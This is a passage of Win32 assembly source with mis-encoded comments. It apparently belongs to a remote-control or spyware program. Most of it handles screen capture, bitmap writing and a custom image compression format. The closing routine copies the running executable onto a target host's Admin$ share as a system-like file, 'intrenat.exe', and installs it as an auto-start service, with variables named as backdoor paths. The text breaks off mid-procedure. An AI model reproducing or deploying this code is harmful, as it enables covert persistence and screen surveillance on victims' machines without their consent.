       mov al,byte ptr [esi+1]
       mov bl,byte ptr [edi+1]
       .if al!=bl
         mov @temp,0
       .else
         mov al,byte ptr [esi+2]
         mov bl,byte ptr [edi+2]
         .if al!=bl
           mov @temp,0
         .else
           mov @temp,1
         .endif
       .endif
     .endif
     popad
     mov eax,@temp
     ret
_colorCmp  endp
;------------------------------------------------
; ����BMP�ļ����ݣ����ذ�������DIBλͼ���ݵ�λͼ���
;------------------------------------------------
_createDIBitmap  proc  _hWnd,_lpFileData
            local @lpBitmapInfo,@lpBitmapBits
            local @dwWidth,@dwHeight
            local @hDc,@hBitmap

            pushad
            ;��ʼ�����в���
            mov @hBitmap,0
            mov esi,_lpFileData
            mov eax,BITMAPFILEHEADER.bfOffBits[esi]
            add eax,esi
            mov @lpBitmapBits,eax
            add esi,sizeof BITMAPFILEHEADER
            mov @lpBitmapInfo,esi
            .if BITMAPINFO.bmiHeader.biSize[esi]==sizeof BITMAPCOREHEADER
              movzx eax,BITMAPCOREHEADER.bcWidth[esi]
              movzx ebx,BITMAPCOREHEADER.bcHeight[esi]
            .else
              movzx eax,word ptr BITMAPINFOHEADER.biWidth[esi]
              movzx ebx,word ptr BITMAPINFOHEADER.biHeight[esi]
            .endif
            mov @dwWidth,eax
            mov @dwHeight,ebx

            ;�����յ�Bitmap Object�������豸������
            invoke GetDC,_hWnd
            push eax
            invoke CreateCompatibleDC,eax
            mov @hDc,eax
            pop eax
            push eax
            invoke CreateCompatibleBitmap,eax,@dwWidth,@dwHeight
            mov @hBitmap,eax
            invoke SelectObject,@hDc,@hBitmap
            pop eax
            invoke ReleaseDC,_hWnd,eax

            ;���ļ�����(λͼ����)��������Bitmap��
            invoke SetDIBitsToDevice,@hDc,0,0,@dwWidth,@dwHeight,\
                   0,0,0,@dwHeight,\
                   @lpBitmapBits,@lpBitmapInfo,DIB_RGB_COLORS
            .if eax==0
               invoke DeleteObject,@hBitmap
               mov @hBitmap,0
            .endif
            invoke DeleteDC,@hDc
            popad
            mov eax,@hBitmap
            ret
_createDIBitmap  endp


;----------------------
; ץ��Ļָ����Χ��ͼ��
;----------------------
_captureCustomerScreen proc _dwX,_dwY,_dwWidth,_dwHeight
         local @hdcScreen,@hdcCompatible
         local @width,@height
         local @hBitmap

         pushad
         mov @hBitmap,0
         ;������Ļ�豸����
         invoke CreateDC,addr lpszDisplay, NULL, NULL, NULL 
         mov @hdcScreen,eax
         invoke CreateCompatibleDC,eax
         mov @hdcCompatible,eax
         ;��ȡ��Ļ����
         invoke GetDeviceCaps,@hdcScreen,HORZRES
         mov @width,eax
         invoke GetDeviceCaps,@hdcScreen,VERTRES
         mov @height,eax
         ;������λͼ
         invoke CreateCompatibleBitmap,@hdcScreen,_dwWidth,_dwHeight
         mov @hBitmap,eax
         invoke SelectObject,@hdcCompatible,eax
         ;����Ļ��ͼ���Ƶ������ļ����豸������
         invoke BitBlt,@hdcCompatible,_dwX,_dwY,_dwWidth,_dwHeight,@hdcScreen,0,0,SRCCOPY
         invoke DeleteDC,@hdcScreen
         invoke DeleteDC,@hdcCompatible
         popad
         mov eax,@hBitmap
         ret
_captureCustomerScreen endp

;---------------------------------
; ��λͼд���ļ�
;---------------------------------
_writeBitmapToFile  proc  _hBitmap,_lpszFileName
       local @hDC     ;�豸������  
       local @iBits   ;��ǰ��ʾ�ֱ�����ÿ��������ռ�ֽ���
	local @wBitCount  ;λͼ��ÿ��������ռ�ֽ���
	local @dwPaletteSize,@dwBmBitsSize,@dwDIBSize,@dwWritten
                         ;�����ɫ���С�� λͼ�������ֽڴ�С ��λͼ�ļ���С �� д���ļ��ֽ���
       local @bm:BITMAP
       local @bmfHdr:BITMAPFILEHEADER  ;λͼ�ļ�ͷ�ṹ   
       local @bi:BITMAPINFOHEADER      ;λͼ���Խṹ       

       local @lpbi
       local @fh,@hDib,@hPal,@hOldPal  ;ָ��λͼ��Ϣͷ�ṹ,�����ļ��������ڴ�������ɫ����

       local @temp,@temp1,@temp2

       ;������д���ļ�
       invoke CreateFile,addr lpszBmpFile, GENERIC_WRITE, 
		 FILE_SHARE_READ,0, CREATE_ALWAYS,
               FILE_ATTRIBUTE_NORMAL,0
       mov @fh,eax

       mov @dwPaletteSize,0
       invoke CreateDC,addr lpszDisplay,NULL,NULL,NULL
       mov @hDC,eax
       invoke GetDeviceCaps,@hDC,BITSPIXEL
       mov @iBits,eax
       invoke GetDeviceCaps,@hDC,PLANES
       invoke DeleteDC,@hDC

       .if @iBits<=1
          mov @wBitCount,1
       .elseif @iBits<=4
          mov @wBitCount,4
       .elseif @iBits<=8
          mov @wBitCount,8
       .else
          mov @wBitCount,24
       .endif

       ;�����ɫ���С
       ;1��4��8�ֱ��Ӧ2��16��256��RGBQUAD�����Ϊ24ʱ����ɫ����
       .if @wBitCount<=8
         mov eax,1
         mov ecx,@wBitCount
         rol ax,cl  ;  ��1������Ӧ��λ��
         mov @temp,eax
         mov ebx,sizeof RGBQUAD
         mov @temp,eax
         mov @temp1,ebx
         fild @temp
         fild @temp1
         fmul
         fistp @dwPaletteSize
       .endif


       ;����λͼ��Ϣͷ�ṹ
       invoke GetObject,_hBitmap,sizeof BITMAP,addr @bm
       invoke RtlZeroMemory,addr @bi,sizeof BITMAPINFOHEADER
       mov @bi.biSize,sizeof BITMAPINFOHEADER
       push @bm.bmWidth
       pop @bi.biWidth
       push @bm.bmHeight
       pop @bi.biHeight
       mov @bi.biPlanes,1
       push @wBitCount
       pop @bi.biBitCount
       mov @bi.biCompression,BI_RGB

       mov eax,@bm.bmWidth
       mov @temp,eax
       fild @temp
       fild @wBitCount
       fmul
       fistp @temp2  
       fild @temp2    ;+31
       mov @temp1,31  
       fild @temp1
       fadd
       fistp @temp2 
       xor edx,edx
       mov eax,@temp2   ;/8   
       mov ecx,8
       div ecx

       xor edx,edx
       mov ecx,4        ;/4
       div ecx
       mov @temp2,eax
       fild @temp2     ;*4
       mov @temp1,4
       fild @temp1
       fmul
       fistp @temp2

       fild @temp2
       fild @bm.bmHeight
       fmul
       fistp @dwBmBitsSize 

       mov edx,@dwBmBitsSize
       add edx,@dwPaletteSize
       add edx,sizeof BITMAPINFOHEADER



       ;Ϊλͼ���ݷ����ڴ�
       invoke GlobalAlloc,GHND,edx
       mov @hDib,eax
       invoke GlobalLock,@hDib
       mov @lpbi,eax   ;��ָ���@lpbi

       invoke MemCopy,addr @bi,@lpbi,sizeof BITMAPINFOHEADER
       
       ;�����ɫ��
       invoke GetStockObject,DEFAULT_PALETTE
       mov @hPal,eax
       .if @hPal
          invoke GetDC,NULL
          mov @hDC,eax
          invoke SelectPalette,@hDC,@hPal,FALSE
          mov @hOldPal,eax
          invoke RealizePalette,@hDC
       .endif

       mov eax,@lpbi
       add eax,sizeof BITMAPINFOHEADER
       add eax,@dwPaletteSize

       ;��ȡ�õ�ɫ�����µ�����ֵ����_hBitmapͼ�����ݴ��͵�@lpbi���ڵ�eaxƫ�ƴ�
       invoke GetDIBits,@hDC,_hBitmap,0,@bm.bmHeight,
	       eax,@lpbi,DIB_RGB_COLORS
       ;�ָ���ɫ��
       .if @hOldPal
          invoke SelectPalette,@hDC,@hOldPal,TRUE
          invoke RealizePalette,@hDC
          invoke ReleaseDC,NULL,@hDC
       .endif
     
       ;����λͼ�ļ�ͷ
       invoke RtlZeroMemory,addr @bmfHdr,sizeof BITMAPFILEHEADER

       mov @bmfHdr.bfType,4d42h
       mov eax,sizeof BITMAPFILEHEADER
       add eax,sizeof BITMAPINFOHEADER
       add eax,@dwPaletteSize
       mov @bmfHdr.bfOffBits,eax
       add eax,@dwBmBitsSize
       mov @bmfHdr.bfSize,eax
       mov @dwDIBSize,eax

       ;д��λͼ�ļ�ͷ
       invoke WriteFile,@fh,addr @bmfHdr,\
              sizeof	BITMAPFILEHEADER, addr @dwWritten,NULL
       ;д����������(λͼ����+��ɫ��+����)
       invoke WriteFile,@fh,@lpbi,@dwDIBSize,addr @dwWritten,NULL
       ;�ͷ�������ڴ�
       invoke GlobalUnlock,@hDib
       invoke GlobalFree,@hDib
       invoke CloseHandle,@fh
       ret
_writeBitmapToFile  endp


;---------------------
; ѹ��λͼ����
; ����:eax��ʾѹ�������ݴ�С
; _lpBuffer����ѹ���Ժ������ָ��
;---------------------
_zipBitmap    proc  _hBitmap,_lpBuffer
       local @szPalette[256*3]:byte  ;ǰ40����120���ֽڣ���ɫΪͼ���������У���215����ɫΪϵͳ������
       local @lpbi     ;���λͼ���ݵĻ���������С=_x*_y*3
       local @lpbiTmp  ;���λͼ���ݵĹ���������   ��С=_x*_y*(3+4)Ƶ��ʹ��һ��˫��(4�ֽ�)��ʾ
       local @lpbiNew  ;���ѹ�����ݵĻ�����

       local @dwBiNew  ;ѹ���Ժ�����ݴ�С
       local @dwBuffer ;��������С
       local @dwFrequecy  ;Ƶ�ȴ�С

       local @fh,@hPal,@hOldPal  ;ָ��λͼ��Ϣͷ�ṹ,�����ļ�����ɫ����
       local @hDib,@hDib1,@hDib2
       local @temp,@temp1,@temp2,@temp3
       local @hdc,@hdcCompatible     ;�豸������  
       local @iBits   ;��ǰ��ʾ�ֱ�����ÿ��������ռ�ֽ���
	local @wBitCount  ;λͼ��ÿ��������ռ�ֽ���
	local @dwPaletteSize,@dwBmBitsSize,@dwDIBSize,@dwWritten
                         ;�����ɫ���С�� λͼ�������ֽڴ�С ��λͼ�ļ���С �� д���ļ��ֽ���
       local @bm:BITMAP
       local @bmfHdr:BITMAPFILEHEADER  ;λͼ�ļ�ͷ�ṹ   
       local @bi:BITMAPINFOHEADER      ;λͼ���Խṹ    
       local @rgbFre:RGBFrequency
       local @dwCount,@dwIndex


       ;����λͼ��Ϣͷ�ṹ
       mov @wBitCount,24
       invoke GetObject,_hBitmap,sizeof BITMAP,addr @bm
       invoke RtlZeroMemory,addr @bi,sizeof BITMAPINFOHEADER
       mov @bi.biSize,sizeof BITMAPINFOHEADER
       push @bm.bmWidth
       pop @bi.biWidth
       push @bm.bmHeight
       pop @bi.biHeight
       mov @bi.biPlanes,1
       push @wBitCount
       pop @bi.biBitCount
       mov @bi.biCompression,BI_RGB

       mov eax,@bm.bmWidth
       mov @temp2,eax
       fild @temp2     
       mov eax,@bm.bmHeight
       mov @temp1,eax
       fild @temp1
       fmul
       fistp @temp2
       
       fild @temp2
       mov @temp1,3
       fild @temp1
       fmul
       fistp @dwBuffer 

       fild @temp2
       mov @temp1,7
       fild @temp1
       fmul
       fistp @dwFrequecy
       add @dwFrequecy,10

       ;Ϊλͼ���ݷ����ڴ�
       invoke GlobalAlloc,GHND,@dwBuffer
       mov @hDib,eax
       invoke GlobalLock,@hDib
       mov @lpbi,eax   ;��ָ���@lpbi

       ;Ϊλͼ���ݷ����ڴ�
       invoke GlobalAlloc,GHND,@dwFrequecy
       mov @hDib1,eax
       invoke GlobalLock,@hDib1
       mov @lpbiTmp,eax   ;��ָ���@lpbiTmp

       ;Ϊλͼ���ݷ����ڴ�
       invoke GlobalAlloc,GHND,@dwBuffer
       mov @hDib2,eax
       invoke GlobalLock,@hDib2
       mov @lpbiNew,eax   ;��ָ���@lpbi

       ;�����ɫ��
       invoke GetStockObject,DEFAULT_PALETTE
       mov @hPal,eax
       .if @hPal
          invoke GetDC,NULL
          mov @hdc,eax
          invoke SelectPalette,@hdc,@hPal,FALSE
          mov @hOldPal,eax
          invoke RealizePalette,@hdc
       .endif

       invoke GetDIBits,@hdc,_hBitmap,0,@bm.bmHeight,
	       @lpbi,addr @bi,DIB_RGB_COLORS
       ;�ָ���ɫ��
       .if @hOldPal
          invoke SelectPalette,@hdc,@hOldPal,TRUE
          invoke RealizePalette,@hdc
          invoke ReleaseDC,NULL,@hdc
       .endif

       ;����215����ɫ
       invoke RtlZeroMemory,addr @szPalette,256*3
       mov edi,40*3
       mov @temp,0
       .while TRUE
         .break .if @temp==6
         mov @temp1,0
         .while TRUE
           .break .if @temp1==6
           mov @temp2,0
           .while TRUE
              .break .if @temp2==6
              
              mov esi,offset lpIndexArr
              mov ebx,@temp
              mov al,byte ptr [esi+ebx]
              mov byte ptr @szPalette[edi],al
              inc edi
              mov ebx,@temp1
              mov al,byte ptr [esi+ebx]
              mov byte ptr @szPalette[edi],al
              inc edi
              mov ebx,@temp2
              mov al,byte ptr [esi+ebx]
              mov byte ptr @szPalette[edi],al
              inc edi
              inc @temp2
           .endw
           inc @temp1
         .endw
         inc @temp
       .endw

       ;��ȡ40��������ɫ����ʵ���Ƕ���ɫ����
       ;ȡ���ִ�������40�ַ����ɫ���ǰ120���ֽ���

       mov esi,@lpbi

       mov eax,@dwBuffer
       mov @temp,eax
       mov eax,sizeof RGBFrequency
       mov @temp1,eax

       ;ͳ����ɫ���ֵ�Ƶ�ʣ��������ÿ��ɫ7�ֽڵ���֯��ʽ��ŵ�@lpbiTmp��
       .while TRUE
         .break .if @temp==0
         ;ȡ����ɫ
         mov al,byte ptr [esi]
         mov byte ptr lpCurColor[0],al
         mov al,byte ptr [esi+1]
         mov byte ptr lpCurColor[1],al
         mov al,byte ptr [esi+2]
         mov byte ptr lpCurColor[2],al

         ;��lpCurColor�е���ɫ��ӵ�������
         mov edi,@lpbiTmp
         .while TRUE
           assume edi:ptr RGBFrequency
           mov eax,[edi].count
           .if eax==0   ;δ�ҵ�ƥ������ӵ���ǰλ��
             mov al,byte ptr lpCurColor[0]
             mov [edi].b,al
             mov al,byte ptr lpCurColor[1]
             mov [edi].g,al
             mov al,byte ptr lpCurColor[2]
             mov [edi].r,al
             mov [edi].count,1
             .break
           .else  ;�˴���ֵ
             mov al,[edi].b
             mov byte ptr lpOldColor[0],al
             mov al,[edi].g
             mov byte ptr lpOldColor[1],al
             mov al,[edi].r
             mov byte ptr lpOldColor[2],al
             invoke _colorCmp
             .if eax   ;���
               inc [edi].count
               .break
             .endif
           .endif
           assume edi:nothing
           add edi,@temp1
         .endw
         add esi,3
         sub @temp,3
       .endw
       ;��Ƶ��ͳ�ƵĻ������л�ȡǰ40����ɫ��д���ɫ��
       mov esi,0
       mov @temp,40
       .while TRUE
         .break .if @temp==0

         ;���ҵ�ǰƵ��������ɫƫ�ƣ�ÿ7���ֽڣ��ŵ�EAX�У�
         mov edi,@lpbiTmp
         mov @dwIndex,0
         mov @dwCount,0
         mov @temp3,0
         .while TRUE
           assume edi:ptr RGBFrequency
           mov eax,[edi].count
           .break .if eax==0
           .if eax>@dwCount
              mov @dwCount,eax
              mov eax,@temp3
              mov @dwIndex,eax
           .endif
           assume edi:nothing
           inc @temp3
           add edi,@temp1
         .endw

         ;�����ƫ�ƴ�����ɫ����д���ɫ�壬������������Ϊ1
         xor edx,edx
         mov eax,@dwIndex
         mov cx,7
         mul cx
         mov edi,@lpbiTmp
         add edi,eax
         assume edi:ptr RGBFrequency
         mov [edi].count,1
         mov al,[edi].b
         mov @szPalette[esi],al
         mov al,[edi].g
         mov @szPalette[esi+1],al
         mov al,[edi].r
         mov @szPalette[esi+2],al

         assume edi:nothing
         add esi,3
         dec @temp
       .endw

       ;����ɫ������д��@lpbiNew
       invoke MemCopy,addr @szPalette,@lpbiNew,256*3
       mov esi,@lpbi
       mov edi,@lpbiNew
       add edi,256*3     ;������ɫ��

       mov eax,@dwBuffer
       mov @temp,eax
       mov @dwBiNew,256*3 ;ѹ����Ĵ�С

       .while TRUE
         .break .if @temp==0

         ;ȡ��ɫ�����жϸ���ɫ�Ƿ���ǰ40������ɫ�����ǣ����ҳ�������ֵ
         mov al,byte ptr [esi]
         mov byte ptr lpCurColor[0],al
         mov al,byte ptr [esi+1]
         mov byte ptr lpCurColor[1],al
         mov al,byte ptr [esi+2]
         mov byte ptr lpCurColor[2],al

         ;�洢��һ����ɫֵ
         mov al,byte ptr lpOldColor[0]
         mov byte ptr lpBackColor[0],al
         mov al,byte ptr lpOldColor[1]
         mov byte ptr lpBackColor[1],al
         mov al,byte ptr lpOldColor[2]
         mov byte ptr lpBackColor[2],al

         push edi

         mov edi,@lpbiNew
         mov @temp3,40
         mov @dwCount,0
         mov dwIndex,50
         .while TRUE
            .break .if @temp3==0
            mov al,byte ptr [edi]
            mov byte ptr lpOldColor[0],al
            mov al,byte ptr [edi+1]
            mov byte ptr lpOldColor[1],al
            mov al,byte ptr [edi+2]
            mov byte ptr lpOldColor[2],al
            invoke  _colorCmp
            .if eax
              mov eax,@dwCount
              mov dwIndex,al
              .break
            .endif
            add edi,3
            inc @dwCount
            dec @temp3
         .endw 

         pop edi

         ;�ָ���һ����ɫֵ
         mov al,byte ptr lpBackColor[0]
         mov byte ptr lpOldColor[0],al
         mov al,byte ptr lpBackColor[1]
         mov byte ptr lpOldColor[1],al
         mov al,byte ptr lpBackColor[2]
         mov byte ptr lpOldColor[2],al

         .if dwIndex==50  ;δ������ɫ���ҵ��ʺϵ���ɫ
           ;ȡ����ɫ
           mov al,byte ptr [esi]

           invoke _getNewValue  ;ȡ��ֵ,�ֱ���0,33h,66h,99h,0cch,0ffh���,����ֵ��С�ķ���al������
           mov byte ptr lpCurColor[0],al
           mov ah,al

           mov al,byte ptr [esi+1]
           invoke _getNewValue  ;ȡ��ֵ
           mov bl,al
           mov byte ptr lpCurColor[1],bl

           mov al,byte ptr [esi+2]
           invoke _getNewValue  ;ȡ��ֵ
           mov cl,al
           mov byte ptr lpCurColor[2],cl

           ;ȡ��ֵ������
           mov al,ah
           invoke _getValueIndex
           mov dwIndex,al
         .endif

         ;�ж�����ɫ����һ����ɫ�Ƿ�һ��
         invoke _colorCmp
         .if eax  ;��ɫһ��
           ;��С��1
           mov al,byte ptr lpNewValue[0]
           inc al
           .if al==0ffh  ;Ƶ�ȳ���һ���ֽ�,��Ҫд����������
             mov byte ptr [edi],al         ;д����������
             mov al,dwIndex
             mov byte ptr [edi+1],al
             mov byte ptr lpNewValue[0],0  ;Ƶ����0
             add @dwBiNew,2                ;�������+2
             add edi,2                     ;����������ָ��
           .else
             mov byte ptr lpNewValue[0],al  ;����Ƶ��
             mov al,dwIndex
             mov byte ptr lpNewValue[1],al  ;д������,����Ƿ����ʡ����??????
           .endif
         .else  ;��ɫ��һ��
           mov al,byte ptr lpNewValue[0]
           .if al==0   ;���Ƶ��Ϊ0,��ʾ��
             mov byte ptr lpNewValue[0],1
             mov al,dwIndex
             mov byte ptr lpNewValue[1],al
           .else
             mov byte ptr [edi],al         ;д����������

             mov al,byte ptr lpNewValue[1] 
             mov byte ptr [edi+1],al

             mov byte ptr lpNewValue[0],1
             mov al,dwIndex
             mov byte ptr lpNewValue[1],al

             add @dwBiNew,2                ;�������+2
             add edi,2                     ;����������ָ��
           .endif
         .endif
         ;����ǰ��ɫ������һ����ɫ
         mov al,byte ptr lpCurColor[0]
         mov byte ptr lpOldColor[0],al
         mov al,byte ptr lpCurColor[1]
         mov byte ptr lpOldColor[1],al
         mov al,byte ptr lpCurColor[2]
         mov byte ptr lpOldColor[2],al
         ;����Դָ��
         add esi,3
         sub @temp,3
       .endw

       mov al,byte ptr lpNewValue[0]
       .if al   ;���Ƶ�Ȳ�Ϊ0,��ʾ��δд����������
         mov byte ptr [edi],al         ;д����������
         mov al,byte ptr lpNewValue[1] 
         mov byte ptr [edi+1],al
         add @dwBiNew,2                ;�������+2
       .endif

       ;�ͷ�������ڴ�
       invoke GlobalUnlock,@hDib
       invoke GlobalFree,@hDib

       invoke GlobalUnlock,@hDib1
       invoke GlobalFree,@hDib1

       mov eax,@lpbiNew
       mov edi,_lpBuffer
       mov dword ptr [edi],eax

       mov eax,@dwBiNew   ;����ѹ���Ժ�ĳ���
       ret
_zipBitmap    endp


;--------------------------
; �ļ��ṹ:QiLi+����+���+ѹ��������ʼλ��(����ɫ��)+ѹ�����ݳ���
; �ļ�ͷ+��ɫ��+ѹ������
;--------------------------
_zipBitmapToFile   proc  _hBitmap,_picFileName
       local @dwBiNew  ;ѹ���Ժ�����ݴ�С
       local @fh  ;ָ��λͼ��Ϣͷ�ṹ,�����ļ�����ɫ����
	local @dwPaletteSize,@dwBmBitsSize,@dwDIBSize,@dwWritten
                         ;�����ɫ���С�� λͼ�������ֽڴ�С ��λͼ�ļ���С �� д���ļ��ֽ���
       local @bm:BITMAP
       local @lpBuffer


       ;����ѹ��ͼ���ʽ��Ϣͷ
       invoke RtlZeroMemory,addr lpQLHeader,sizeof QLHeader
       mov lpQLHeader.flag,694C6951h

       invoke GetObject,_hBitmap,sizeof BITMAP,addr @bm
       push @bm.bmWidth
       pop lpQLHeader.w
       push @bm.bmHeight
       pop lpQLHeader.h
       mov lpQLHeader.off,16
       
       invoke _zipBitmap,_hBitmap,addr @lpBuffer
       mov lpQLHeader.len,eax
       mov @dwDIBSize,eax

       ;������д���ļ�
       invoke CreateFile,_picFileName, GENERIC_WRITE, 
		 FILE_SHARE_READ,0, CREATE_ALWAYS,
               FILE_ATTRIBUTE_NORMAL,0
       mov @fh,eax
       ;д���ļ�ͷ
       invoke WriteFile,@fh,addr lpQLHeader,\
              sizeof	QLHeader,addr @dwWritten,NULL
       ;д����������(λͼ����+��ɫ��+����)
       invoke WriteFile,@fh,@lpBuffer,@dwDIBSize,addr @dwWritten,NULL
       ret
_zipBitmapToFile   endp

;---------------------
; ��ѹ��λͼ����
; ����:eax��ʾ��ѹ�������ݴ�С
; _lpZipBufferָ��Ҫ��ѹ������ָ��(����ɫ��)
; _dwSize��ʾѹ�����ݳ���
; _lpBuffer���ؽ�ѹ���Ժ������ָ��(�޵�ɫ��)
;---------------------
_unzipBitmap    proc  _lpZipBuffer,_dwSize,_lpBuffer
       local @dwResult
       pushad
       mov @dwResult,0
       mov esi,_lpZipBuffer
       add esi,256*3
       mov edi,_lpBuffer

       sub _dwSize,256*3
       .while TRUE
         .break .if _dwSize==0
         mov cl,byte ptr [esi]
         mov al,byte ptr [esi+1]

         ;ͨ�������Ż�ȡ��ɫ���Ӧ����ɫֵ����lpCurColor��
         push esi
         push eax
         push ecx

         mov esi,_lpZipBuffer
         mov ch,al
         xor eax,eax
         mov al,ch
         xor dx,dx
         mov ch,3
         mul ch
         add esi,eax
         mov al,byte ptr [esi]
         mov byte ptr lpCurColor[0],al
         mov al,byte ptr [esi+1]
         mov byte ptr lpCurColor[1],al
         mov al,byte ptr [esi+2]
         mov byte ptr lpCurColor[2],al

         pop ecx
         pop eax
         pop esi

         ;��cl����ɫд����������
         .while TRUE
           .break .if cl==0
           mov al,byte ptr lpCurColor[0]
           mov byte ptr [edi],al
           mov al,byte ptr lpCurColor[1]
           mov byte ptr [edi+1],al
           mov al,byte ptr lpCurColor[2]
           mov byte ptr [edi+2],al
           add @dwResult,3
           add edi,3
           dec cl
         .endw

         add esi,2
         sub _dwSize,2
       .endw
       popad
       mov eax,@dwResult
       
       ret
_unzipBitmap    endp

;---------------------------------
;  ��ѹ���Ժ��QLGͼ������ת��ΪBMP���ݲ�д��BMP�ļ�
;---------------------------------
_fromQLPicToBitmap  proc  _lpszQLGFileName,_lpszBMPFileName
       local @hDC     ;�豸������  
       local @iBits   ;��ǰ��ʾ�ֱ�����ÿ��������ռ�ֽ���
	local @wBitCount:word  ;λͼ��ÿ��������ռ�ֽ���
	local @dwPaletteSize,@dwBmBitsSize,@dwDIBSize,@dwWritten
                         ;�����ɫ���С�� λͼ�������ֽڴ�С ��λͼ�ļ���С �� д���ļ��ֽ���
       local @bm:BITMAP
       local @bmfHdr:BITMAPFILEHEADER  ;λͼ�ļ�ͷ�ṹ   
       local @bi:BITMAPINFOHEADER      ;λͼ���Խṹ       

       local @lpbi,@lpbiNew
       local @fh,@fh1,@hDib,@hDib1,@hPal,@hOldPal  ;ָ��λͼ��Ϣͷ�ṹ,�����ļ��������ڴ�������ɫ����
       local @hFile
       local @temp,@temp1,@temp2
       local @qlHeader:QLHeader
       local @dwBytesRead
       local @dwBuffer


       ;��QLG�ļ���ȡ����,��ȡѹ������
       invoke CreateFile,_lpszQLGFileName,GENERIC_READ,\
                      FILE_SHARE_READ,0,OPEN_EXISTING,\
                      FILE_ATTRIBUTE_NORMAL,0
       mov @hFile,eax
       ;��ȡ�ļ�ͷ
       invoke ReadFile,@hFile,addr @qlHeader,16,addr @dwBytesRead,NULL

       ;��������С=width*height*3
       movzx eax,@qlHeader.w
       mov @temp2,eax
       fild @temp2     
       movzx eax,@qlHeader.h
       mov @temp1,eax
       fild @temp1
       fmul
       fistp @temp2
       
       fild @temp2
       mov @temp1,3
       fild @temp1
       fmul
       fistp @dwBuffer 

       ;Ϊλͼ���ݷ����ڴ�
       mov eax,@qlHeader.len
       invoke GlobalAlloc,GHND,eax
       mov @hDib,eax
       invoke GlobalLock,@hDib
       mov @lpbi,eax   ;��ָ���@lpbi

       mov eax,@qlHeader.len
       mov @temp,eax
       invoke ReadFile,@hFile,@lpbi,@temp,addr @dwBytesRead,NULL
       invoke CloseHandle,@hFile

       mov @wBitCount,24
       mov @dwPaletteSize,0  ;��ɫ���СΪ0

       ;����λͼ��Ϣͷ�ṹ   !!!!!!!һ��Ҫע���ֶε����ͣ�ʹ��push��POPʱ������ɳ����������
       invoke RtlZeroMemory,addr @bi,sizeof BITMAPINFOHEADER
       mov @bi.biSize,sizeof BITMAPINFOHEADER
       movzx eax,@qlHeader.w
       mov @bi.biWidth,eax
       movzx eax,@qlHeader.h
       mov @bi.biHeight,eax
       mov @bi.biPlanes,1
       mov @bi.biBitCount,24
       mov @bi.biCompression,BI_RGB

       ;Ϊλͼ���ݷ����ڴ�
       mov eax,@dwBuffer
       invoke GlobalAlloc,GHND,eax
       mov @hDib1,eax
       invoke GlobalLock,@hDib1
       mov @lpbiNew,eax   

       ;������д���ļ�
       invoke CreateFile,_lpszBMPFileName,GENERIC_WRITE, 
		 FILE_SHARE_READ,0, CREATE_ALWAYS,
               FILE_ATTRIBUTE_NORMAL,0
       mov @fh,eax
       .if eax==INVALID_HANDLE_VALUE
         ret
       .endif

       ;����λͼ�ļ�ͷ
       invoke RtlZeroMemory,addr @bmfHdr,sizeof BITMAPFILEHEADER

       mov @bmfHdr.bfType,4d42h
       mov eax,sizeof BITMAPFILEHEADER
       add eax,sizeof BITMAPINFOHEADER
       add eax,@dwPaletteSize
       mov @bmfHdr.bfOffBits,eax
       add eax,@dwBmBitsSize
       mov @bmfHdr.bfSize,eax

       ;д��λͼ�ļ�ͷ
       invoke WriteFile,@fh,addr @bmfHdr,\
              sizeof	BITMAPFILEHEADER, addr @dwWritten,NULL
       invoke WriteFile,@fh,addr @bi,\
              sizeof	BITMAPINFOHEADER, addr @dwWritten,NULL
       ;д���ѹ�����ͼ������
       mov eax,@qlHeader.len
       invoke _unzipBitmap,@lpbi,eax,@lpbiNew
       mov @temp,eax
       invoke WriteFile,@fh,@lpbiNew,@temp,addr @dwWritten,NULL

       ;�ͷ�������ڴ�
       invoke GlobalUnlock,@hDib
       invoke GlobalFree,@hDib
       invoke GlobalUnlock,@hDib1
       invoke GlobalFree,@hDib1
       invoke CloseHandle,@fh

       ret
_fromQLPicToBitmap  endp



;-----------------------------------------------------
; �����Ŵ��͵�Ŀ�������������Ϊ��̨����ͬʱ�������ų���
; ����_lpHostΪĿ�������IP��ַ��������أ���ΪNULL
;-----------------------------------------------------
_installCmdService  proc _lpHost
      local @schSCManager,@schService
      local @lpCurrentPath[MAX_PATH]:byte
      local @lpImagePath[MAX_PATH]:byte
      local @lpHostName
      local @hSearch,@dwErrorCode
      local @installServiceStatus:SERVICE_STATUS
      local @fileData:WIN32_FIND_DATA

      .if _lpHost==NULL
        ;������ų���ı��ؾ���·��c:\windows\system32\intrenat.exe
        invoke GetSystemDirectory,addr @lpImagePath,MAX_PATH
        invoke lstrcat,addr @lpImagePath,addr lpszExeName
        mov @lpHostName,NULL
      .else
        ;������ų����URL·��\\10.115.47.36\Admin$\system32\intrenat.exe
        invoke RtlZeroMemory,addr @lpImagePath,MAX_PATH
        invoke wsprintf,addr @lpImagePath,addr lpszBackDoorFmt1,_lpHost

        invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,256
        mov @lpHostName,eax
        invoke wsprintf,@lpHostName,addr lpszBackDoorFmt2,\
               addr lpszPreURL,_lpHost
      .endif

      ;�����غ�̨�����Ƶ�Ŀ�����
      invoke FindFirstFile,addr @lpImagePath,addr @fileData
      .if eax==INVALID_HANDLE_VALUE ;�ļ�������
        invoke GetModuleFileName,NULL,addr @lpCurrentPath,MAX_PATH
        invoke CopyFile,addr @lpCurrentPath,addr @lpImagePath,FALSE
      .else  ;�ļ��Ѿ�������
        invoke FindClose,eax
      .endif

      ;��Ŀ�������ķ��������
      invoke OpenSCManager,@lpHostName,NULL,SC_MANAGER_ALL_ACCESS
      mov @schSCManager,eax
      .if @schSCManager
        ;��������
        invoke CreateService,@schSCManager,addr lpszServiceName,addr lpszDisplayName,\
              SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS or SERVICE_INTERACTIVE_PROCESS,\
              SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,addr lpszServicePath,\
              NULL,NULL,NULL,NULL,NULL
        mov @schService,eax
        .if eax==NULL
           invoke GetLastError
           mov @dwErrorCode,eax
           .if eax!=ERROR_SERVICE_EXISTS
              invoke CloseServiceHandle,@schSCManager
           .else  ;�����Ѿ����ڣ����ȡ���ŷ�����
              invoke OpenService,@schSCManager,addr lpszServiceName,SERVICE_START
              mov @schService,eax
              .if eax==NULL
                invoke CloseServiceHandle,@schSCManager
              .endif
           .endif
        .endif

        ;�������ų���
        invoke StartService,@schService,0,NULL
        .if eax==0
          invoke CloseServiceHandle,@schSCManager
          invoke CloseServiceHandle,@schService
          invoke MessageBox,NULL,addr lpszStartFail,NULL,MB_OK
          ret
        .endif
        ;�ȴ���Ϊ����״̬
        .while TRUE
          invoke QueryServiceStatus,@schService,addr @installServiceStatus
          .break .if eax==0
